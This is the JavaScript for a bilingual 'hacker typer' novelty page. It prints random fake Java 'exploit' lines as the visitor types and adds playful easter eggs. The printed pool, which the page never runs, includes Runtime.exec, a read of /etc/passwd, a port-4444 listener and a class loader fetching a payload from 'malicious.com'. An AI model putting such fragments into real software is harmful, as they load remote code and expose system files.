(function() {
    const outputArea = document.getElementById('output-text');
    const outputContainer = document.getElementById('output-area');
    const lineCountSpan = document.getElementById('line-count');
    const clearBtn = document.getElementById('clear-btn');
    const panicBtn = document.getElementById('panic-btn');
    const modeStatus = document.getElementById('mode-status');
    const linesLabel = document.getElementById('lines-label');
    const modeLabel = document.getElementById('mode-label');
    const clearLabel = document.getElementById('clear-label');
    const panicLabel = document.getElementById('panic-label');
    const promptText = document.getElementById('prompt-text');

    // Detectar idioma por el HTML
    const isEnglish = document.documentElement.lang === 'en';
    
    // Textos según idioma (SOLO LOS MENSAJES INICIALES)
    const texts = {
        es: {
            lines: 'Líneas generadas',
            mode: 'Modo',
            clear: 'Limpiar',
            panic: 'PANIC',
            sysInit: '[JAVA] Inicializando JVM...',
            sysLoad: '[JAVA] Cargando clases... OK',
            sysPrep: '[JAVA] Preparando exploits...',
            sysReady: '[JAVA] Listo. Empieza a escribir...',
            sysCleared: '[JAVA] Pantalla limpia. Listo.',
            sysPanic: '[JAVA] 🔴 PANIC! Ocultando rastros...',
            sysStealth: '[JAVA] Modo sigilo.',
            siriusMessage: '\n\n[JAVA] ⚠️ MODO SIRIUS ACTIVADO - TODO AMARILLO ⚠️\n\n',
            glitchMessage: '⚠️ NOeye conoce tu IP: 192.168.95.150 ⚠️'
        },
        en: {
            lines: 'Lines generated',
            mode: 'Mode',
            clear: 'Clear',
            panic: 'PANIC',
            sysInit: '[JAVA] Initializing JVM...',
            sysLoad: '[JAVA] Loading classes... OK',
            sysPrep: '[JAVA] Preparing exploits...',
            sysReady: '[JAVA] Ready. Start typing...',
            sysCleared: '[JAVA] Screen cleared. Ready.',
            sysPanic: '[JAVA] 🔴 PANIC! Hiding traces...',
            sysStealth: '[JAVA] Stealth mode.',
            siriusMessage: '\n\n[JAVA] ⚠️ SIRIUS MODE ACTIVATED - ALL YELLOW ⚠️\n\n',
            glitchMessage: '⚠️ NOeye knows your IP: 192.168.95.150 ⚠️'
        }
    };

    const t = isEnglish ? texts.en : texts.es;

    // Aplicar textos iniciales
    if (linesLabel) linesLabel.textContent = t.lines;
    if (modeLabel) modeLabel.textContent = t.mode;
    if (clearLabel) clearLabel.textContent = t.clear;
    if (panicLabel) panicLabel.textContent = t.panic;
    if (promptText) promptText.textContent = 'java -cp . HackerRoom>';

    // POOL DE CÓDIGO JAVA (igual que antes)
    const javaCode = [
        "public class Exploit {",
        "    public static void main(String[] args) {",
        "        try {",
        "            Runtime.getRuntime().exec(\"id\");",
        "        } catch (Exception e) {",
        "            e.printStackTrace();",
        "        }",
        "    }",
        "}",
        "ProcessBuilder pb = new ProcessBuilder(\"/bin/sh\", \"-c\", \"ls -la\");",
        "Process p = pb.start();",
        "BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));",
        "String line; while ((line = reader.readLine()) != null) { System.out.println(line); }",
        "ClassLoader.getSystemClassLoader().loadClass(\"com.hack.Main\");",
        "FileInputStream fis = new FileInputStream(\"/etc/passwd\");",
        "byte[] buffer = new byte[1024]; fis.read(buffer);",
        "ServerSocket serverSocket = new ServerSocket(4444);",
        "Socket clientSocket = serverSocket.accept();",
        "PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true);",
        "ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"exploit.ser\"));",
        "Object obj = ois.readObject();",
        "Method method = obj.getClass().getMethod(\"exploit\");",
        "method.invoke(obj);",
        "URL url = new URL(\"http://malicious.com/payload.jar\");",
        "URLClassLoader classLoader = new URLClassLoader(new URL[]{url});",
        "Class<?> loadedClass = classLoader.loadClass(\"Payload\");",
        "JDBCTYPE = \"com.mysql.jdbc.Driver\";",
        "Connection conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/malicious\", \"root\", \"password\");",
        "Statement stmt = conn.createStatement();",
        "ResultSet rs = stmt.executeQuery(\"SELECT * FROM users\");",
        "String query = \"INSERT INTO exploits VALUES ('\" + payload + \"')\";",
        "PreparedStatement pstmt = conn.prepareStatement(\"UPDATE system SET hacked = ? WHERE id = 1\");",
        "pstmt.setBoolean(1, true);",
        "System.setProperty(\"javax.net.ssl.trustStore\", \"/path/to/malicious/store\");",
        "KeyStore ks = KeyStore.getInstance(\"JKS\");",
        "ks.load(new FileInputStream(\"exploit.keystore\"), \"password\".toCharArray());",
        "Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");",
        "cipher.init(Cipher.ENCRYPT_MODE, secretKey, ivSpec);",
        "byte[] encrypted = cipher.doFinal(plainText.getBytes());",
        "MessageDigest md = MessageDigest.getInstance(\"SHA-256\");",
        "byte[] hash = md.digest(data);",
        "new Thread(() -> {",
        "    while(true) {",
        "        System.out.println(\"Hacking mainframe...\");",
        "    }",
        "}).start();",
        "synchronized(lock) { lock.wait(); }",
        "this.getClass().getClassLoader().getResourceAsStream(\"exploit.class\");",
        "javax.script.ScriptEngineManager factory = new javax.script.ScriptEngineManager();",
        "javax.script.ScriptEngine engine = factory.getEngineByName(\"JavaScript\");",
        "engine.eval(\"java.lang.Runtime.getRuntime().exec('id')\");",
        "// Payload injection complete",
        "System.out.println(\"Exploit deployed\");",
        "logger.info(\"Connection established\");",
        "@Override public void run() {",
        "    this.secretKey = KeyGenerator.getInstance(\"AES\").generateKey();",
        "}"
    ];

    const fullJavaPool = javaCode;
    let lineCounter = 0;
    let currentContent = '';
    let lastEasterEgg = null;
    let cooldownActive = false;
    let siriusEasterEggActivated = false;

    // Función para asegurar el foco (CRÍTICO)
    function ensureFocus() {
        if (document.activeElement !== outputContainer) {
            outputContainer.focus({ preventScroll: true });
        }
    }

    function triggerGlitchEffect(message) {
        const originalBg = outputContainer.style.background;
        const originalColor = outputContainer.style.color;
        const originalTransform = outputContainer.style.transform;
        
        outputContainer.style.animation = 'glitch-bg 0.2s infinite';
        outputContainer.style.background = 'linear-gradient(45deg, #ff0000, #00ff00, #0000ff, #ff00ff)';
        outputContainer.style.backgroundSize = '400% 400%';
        outputContainer.style.color = '#ffffff';
        outputContainer.style.textShadow = '3px 3px 0 #ff0000, -3px -3px 0 #0000ff, 3px -3px 0 #00ff00';
        outputContainer.style.transform = 'skew(2deg, 1deg)';
        
        const glitchLine = message + '\n';
        currentContent += glitchLine;
        outputArea.innerText = currentContent;
        lineCounter++;
        lineCountSpan.textContent = lineCounter;
        
        setTimeout(() => {
            outputContainer.style.animation = '';
            outputContainer.style.background = originalBg;
            outputContainer.style.color = originalColor;
            outputContainer.style.textShadow = '';
            outputContainer.style.transform = originalTransform;
            outputContainer.style.backgroundSize = '';
        }, 1200);
    }

    function activateSiriusMode() {
        if (siriusEasterEggActivated) return;
        siriusEasterEggActivated = true;
        alert("SIRIUS KNEW YOU WOULD BE THAT SICK");
        
        // Cambiar colores
        document.body.style.backgroundColor = '#ffff00';
        document.body.style.color = '#000000';
        document.body.style.textShadow = 'none';
        
        const hackerRoom = document.getElementById('hacker-room');
        const controlPanel = document.getElementById('control-panel');
        
        if (hackerRoom) {
            hackerRoom.style.backgroundColor = '#ffff00';
            hackerRoom.style.borderColor = '#000000';
            hackerRoom.style.boxShadow = '0 0 30px #ffff00';
            hackerRoom.style.color = '#000000';
        }
        
        outputContainer.style.backgroundColor = '#ffff00';
        outputContainer.style.color = '#000000';
        outputContainer.style.caretColor = '#000000';
        
        const statusBar = document.getElementById('status-bar');
        if (statusBar) {
            statusBar.style.backgroundColor = '#cccc00';
            statusBar.style.color = '#000000';
            statusBar.style.borderBottomColor = '#000000';
        }
        
        const inputLine = document.getElementById('input-line');
        if (inputLine) {
            inputLine.style.backgroundColor = '#cccc00';
            inputLine.style.color = '#000000';
            inputLine.style.borderColor = '#000000';
        }
        
        if (controlPanel) {
            controlPanel.style.backgroundColor = '#cccc00';
            controlPanel.style.color = '#000000';
            controlPanel.style.borderColor = '#000000';
        }
        
        const buttons = document.querySelectorAll('button');
        buttons.forEach(btn => {
            btn.style.backgroundColor = '#000000';
            btn.style.color = '#ffff00';
            btn.style.borderColor = '#000000';
        });
        
        const siriusMessage = t.siriusMessage;
        currentContent += siriusMessage;
        outputArea.innerText = currentContent;
        lineCounter += 3;
        lineCountSpan.textContent = lineCounter;
    }

    function addHackerText() {
        if (!siriusEasterEggActivated && lineCounter >= 999) {
            activateSiriusMode();
            return;
        }
        
        let easterEggActivated = false;
        
        if (!cooldownActive) {
            const randomValue = Math.random() * 100;
            
            // Pyce (azul) - 0.5%
            if (randomValue < 0.5 && lastEasterEgg !== 'pyce') {
                const pyceLine = '// Pyce' + 'y'.repeat(Math.floor(Math.random() * 3) + 1) + 'Factory factory = new PyceFactory();';
                
                currentContent += pyceLine + '\n';
                outputArea.innerHTML = currentContent.replace(
                    /Pycey*/g, 
                    match => `<span style="color: #4287f5; font-weight: bold; text-shadow: 0 0 15px #4287f5;">${match}</span>`
                );
                
                lineCounter++;
                lineCountSpan.textContent = lineCounter;
                lastEasterEgg = 'pyce';
                easterEggActivated = true;
            }
            // Kirb (rosa) - 0.5%
            else if (randomValue >= 0.5 && randomValue < 1.0 && lastEasterEgg !== 'kirb') {
                const kirbLine = 'Kirb' + '!'.repeat(Math.floor(Math.random() * 5) + 1) + ' kirb = new Kirb();';
                
                currentContent += kirbLine + '\n';
                outputArea.innerHTML = currentContent.replace(
                    /Kirb!*/g, 
                    match => `<span style="color: #ff69b4; font-weight: bold; text-shadow: 0 0 15px #ff69b4;">${match}</span>`
                );
                
                lineCounter++;
                lineCountSpan.textContent = lineCounter;
                lastEasterEgg = 'kirb';
                easterEggActivated = true;
            }
            // GLITCH - 0.5%
            else if (randomValue >= 1.0 && randomValue < 1.5 && lastEasterEgg !== 'glitch') {
                triggerGlitchEffect(t.glitchMessage);
                lastEasterEgg = 'glitch';
                easterEggActivated = true;
            }
        }

        if (easterEggActivated) {
            cooldownActive = true;
            setTimeout(() => { cooldownActive = false; }, 300);
        } else {
            // Código Java normal
            const randomIndex = Math.floor(Math.random() * fullJavaPool.length);
            let randomText = fullJavaPool[randomIndex];

            // Añadir variaciones
            if (Math.random() > 0.5) randomText = '    ' + randomText;
            if (Math.random() > 0.8) randomText = '\n' + randomText;

            const newLine = randomText + '\n';
            currentContent += newLine;
            outputArea.innerText = currentContent;

            lineCounter++;
            lineCountSpan.textContent = lineCounter;
        }
        
        outputContainer.scrollTop = outputContainer.scrollHeight;
    }

    function clearScreen() {
        currentContent = '';
        outputArea.innerHTML = '';
        lineCounter = 0;
        lineCountSpan.textContent = lineCounter;
        lastEasterEgg = null;
        cooldownActive = false;
        siriusEasterEggActivated = false;

        // Restaurar colores
        document.body.style.backgroundColor = '';
        document.body.style.color = '';
        document.body.style.textShadow = '';
        
        const hackerRoom = document.getElementById('hacker-room');
        const controlPanel = document.getElementById('control-panel');
        
        if (hackerRoom) {
            hackerRoom.style.backgroundColor = '';
            hackerRoom.style.borderColor = '';
            hackerRoom.style.boxShadow = '';
            hackerRoom.style.color = '';
        }
        
        outputContainer.style.backgroundColor = '';
        outputContainer.style.color = '';
        outputContainer.style.caretColor = '';
        
        const statusBar = document.getElementById('status-bar');
        if (statusBar) {
            statusBar.style.backgroundColor = '';
            statusBar.style.color = '';
            statusBar.style.borderBottomColor = '';
        }
        
        const inputLine = document.getElementById('input-line');
        if (inputLine) {
            inputLine.style.backgroundColor = '';
            inputLine.style.color = '';
            inputLine.style.borderColor = '';
        }
        
        if (controlPanel) {
            controlPanel.style.backgroundColor = '';
            controlPanel.style.color = '';
            controlPanel.style.borderColor = '';
        }
        
        const buttons = document.querySelectorAll('button');
        buttons.forEach(btn => {
            btn.style.backgroundColor = '';
            btn.style.color = '';
            btn.style.borderColor = '';
        });

        setTimeout(() => {
            if (currentContent === '') {
                currentContent = t.sysCleared + '\n';
                outputArea.innerText = currentContent;
                lineCounter = 1;
                lineCountSpan.textContent = lineCounter;
            }
        }, 50);
        
        ensureFocus();
    }

    function panic() {
        clearScreen();
        currentContent = t.sysPanic + '\n' + t.sysStealth + '\n';
        outputArea.innerText = currentContent;
        lineCounter = 2;
        lineCountSpan.textContent = lineCounter;
        ensureFocus();
    }

    // EVENTOS - IGUAL QUE EN LINUX
    document.addEventListener('keydown', (event) => {
        // Ignorar atajos del navegador
        if (event.key === 'F5' || (event.ctrlKey && event.key === 'r') || 
            (event.ctrlKey && event.key === 'R') || (event.metaKey && event.key === 'r')) {
            return;
        }
        
        // Prevenir comportamiento por defecto SOLO para teclas normales
        if (!event.ctrlKey && !event.altKey && !event.metaKey) {
            event.preventDefault();
        }
        
        addHackerText();
        ensureFocus();
        
        modeStatus.textContent = 'JAVA';
    });

    // Evento específico en el contenedor
    outputContainer.addEventListener('keydown', (event) => {
        if (event.defaultPrevented) return;
        event.preventDefault();
        addHackerText();
    });

    // Asegurar que el contenedor pueda recibir foco
    outputContainer.setAttribute('tabindex', '0');
    
    // Inicialización
    window.onload = () => {
        currentContent = '';
        outputArea.innerHTML = '';
        currentContent += t.sysInit + '\n';
        currentContent += t.sysLoad + '\n';
        currentContent += t.sysPrep + '\n';
        currentContent += t.sysReady + '\n';
        currentContent += '> _ \n';
        
        outputArea.innerText = currentContent;
        lineCounter = 5;
        lineCountSpan.textContent = lineCounter;
        outputContainer.scrollTop = outputContainer.scrollHeight;
        
        lastEasterEgg = null;
        cooldownActive = false;
        siriusEasterEggActivated = false;
        
        // ENFOCAR AUTOMÁTICAMENTE
        setTimeout(() => {
            ensureFocus();
        }, 100);
    };
    
    // Reenfocar al hacer clic
    document.addEventListener('click', (event) => {
        if (!event.target.closest('button')) {
            ensureFocus();
        }
    });
    
    // Botones
    clearBtn.addEventListener('click', (event) => {
        event.preventDefault();
        clearScreen();
    });
    
    panicBtn.addEventListener('click', (event) => {
        event.preventDefault();
        panic();
    });

})();